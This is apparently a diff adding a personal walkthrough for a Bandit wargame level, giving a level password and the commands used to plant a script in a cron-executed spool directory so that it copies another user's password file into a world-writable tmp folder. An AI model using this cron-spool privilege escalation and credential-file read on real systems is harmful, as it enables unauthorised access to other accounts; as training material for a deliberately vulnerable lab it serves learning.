@@ -1,0 +1,18 @@
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+Commands Used:
+mkdir /tmp/level24/
+chmod 777 /tmp/level24/
+touch /tmp/level24/bandit24.sh
+
+In bandit24.sh:
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 >> /tmp/level24/pass
+
+chmod 777 /tmp/level24/bandit24.sh
+
+cp /tmp/level24/bandit24.sh /var/spool/bandit24/
+
+cat pass
+
+You have to create a script to put into /var/spool/bandit24/ since all the scripts in that folder is executed after a certain interval. So through this, you get the script to send the password from /etc/bandit_pass/bandit24 into our tmp folder.
